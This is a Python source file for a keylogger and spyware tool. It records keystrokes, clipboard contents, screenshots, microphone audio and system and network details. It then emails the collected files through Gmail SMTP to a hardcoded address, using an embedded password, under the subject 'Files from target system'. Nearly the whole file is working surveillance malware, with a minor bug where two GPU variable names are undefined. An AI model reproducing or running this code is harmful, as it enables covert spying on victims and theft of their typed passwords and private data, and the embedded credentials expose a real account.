# imports
from pynput.keyboard import Key, Listener
import wave
import os, sys
import sounddevice as sd
from scipy.io.wavfile import write
from tkinter import Tk
import pyscreenshot
import platform
import psutil
import GPUtil
import socket
import time, datetime
import asyncio
from cryptography.fernet import Fernet
import smtplib, threading
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import http.client as httplib

os.environ['EMAIL'] = "godwillonyewuchii@gmail.com"
os.environ['PASSWORD'] = "09092238604"

Time = datetime.datetime.now()
stoppingTime = Time + datetime.timedelta(seconds=180)

filePath: list = [
    "clipboard_file.txt",
    "system_Information_file.txt",
    "keyboard_file.txt",
    "screenshot.jpg",
    "soundrecord.wav"
]

# copying of clipboard textn
def clipboard_func():
    try:
        data = Tk().clipboard_get()
    except Exception:
        data = "no data in clipboard"
    file1 = open('clipboard_file.txt', "a")
    file1.write(data)
    file1.close()


# taking screenshot
def screenshot_func(count):
    image = pyscreenshot.grab()
    image.save(f"./screenshot.jpg", "JPEG")


# recording audio
def sound(count):
    fs = 48000
    sd.default.samplerate = fs
    sd.default.channels = 2
    duration = count
    myrecording = sd.rec(int(duration * fs))
    sd.wait()
    write("soundrecord.wav", fs, myrecording)

# getting the system version and info


def system_Data():
    # getting disk info
    partitions = psutil.disk_partitions()
    for partition in partitions:
        try:
            partition_usage = psutil.disk_usage(partition.mountpoint)
        except PermissionError:
            continue
        ROM_space = partition_usage.total
    # getting network info
    addrs = psutil.net_if_addrs()
    for interface_name, interface_addrs in addrs.items():
        for address in interface_addrs:
            if str(address.family) == "AddressFamily.AF_INET":
                IP_Address = address.address
                Netmask = address.netmask
                BroadcastIP = address.broadcast
            elif str(address.family) == "AddressFamily.AF_PACKET":
                IP_Address = address.address
                Netmask = address.netmask
                BroadcastIP = address.broadcast
    # getting gpu info
    gpus: list = GPUtil.getGPUs()
    for gpu in gpus:
        try:
            gpu_name = gpu.name
            gpu_memory = gpu.memoryTotal
        except:
            continue
    body = f'''
    ==== The System Information ====\n

    Computer Name : {platform.node()}\n
    Machine Type: {platform.machine()}\n
    Processor : {platform.processor()}\n
    Processor Speed : {psutil.cpu_freq().current / 1000}\n
    Operating System: {platform.system()} {platform.release()}; version : {platform.version()}\n
    Total RAM Installed: {round(psutil.virtual_memory().total/1000000000, 2)} GB\n
    Total RAM Installed: {round(ROM_space/1000000000)} GB\n
    Ip address: {IP_Address}\n
    Netmask: {Netmask}\n
    BroadcastIp : {BroadcastIP}\n
    Installed GPU : {age_name if gpus != []  else 'No GPU found'}
    GPU memory: {age_memory if gpus != [] else 'No GPU found'}
    '''
    file1 = open('system_Information_file.txt', 'a')
    file1.write(body)
    file1.close()

# creatin my keyboard listener
def onPress(key):
    if key == Key.esc:
        return False
    try:
        k = key.char
    except:
        k = key.name
        if k == "space":
            k = " "
    file1 = open('keyboard_file.txt', "a")
    file1.write(k)
    file1.close()


def onRelease(key):
    if (key == Key.esc):
        return False
    if (datetime.datetime.now()  > stoppingTime ):
        return False
listener = Listener(on_press=onPress, on_release=onRelease)
listener.start()

# clear files content
def clearContent(files):
    for file in files:
        with open(file, 'wb') as file:
            file.truncate()

#check internet connection
def internet_conn(url='www.google.com', timeout=3):
    conn = httplib.HTTPConnection(url, timeout=timeout)
    try:
        conn.request('HEAD', '/')
        conn.close()
        return True
    except Exception as e:
        return False

# email setup

def send_email():
    sender_mail = os.getenv('EMAIL')
    reciever_mail = os.getenv('EMAIL')
    message = MIMEMultipart()
    message['From'] = sender_mail
    message['To'] = reciever_mail
    message['Subject'] = "Files from target system "
    mail_content = '''
    This email contains the content of the file from the system
    '''

    message.attach(MIMEText(mail_content, 'plain'))
    for file in filePath:
        attach_file_name = file
        attach_file = open(attach_file_name, 'rb')
        payload = MIMEBase('application', 'octate-stream')
        payload.set_payload((attach_file).read())
        encoders.encode_base64(payload)
        payload.add_header('Content-Decomposition',
                        'attachment', filename=attach_file_name)
        message.attach(payload)

    try:
        if internet_conn():
            password = os.getenv('PASSWORD')
            smtpObj = smtplib.SMTP('smtp.gmail.com', 587)
            smtpObj.starttls()
            print(smtpObj, sender_mail, password)
            smtpObj.login(sender_mail, password)
            text = message.as_string()
            smtpObj.sendmail(sender_mail, reciever_mail, text)
            smtpObj.quit()
            clearContent(filePath)
            print('email sent successfully')
            
    except Exception as e:
        setInterval(90)

def final_func():
    global Time, stoppingTime
    if (datetime.datetime.now()) >= stoppingTime:
        print("working HERE")
        send_email()               
        Time = datetime.datetime.now()
        stoppingTime = Time + datetime.timedelta(seconds=180)
        print(Time, stoppingTime)

def setInterval(time):
    e = threading.Event()
    while not e.wait(time):
        if (datetime.datetime.now()) <= stoppingTime:
            count = str(datetime.datetime.now().timestamp()).split('.')[0]
            clipboard_func()
            screenshot_func(count[8:10])
            system_Data()
            sound(time)
        else:
            final_func()
            setInterval(90)
            
setInterval(90)
print("working")
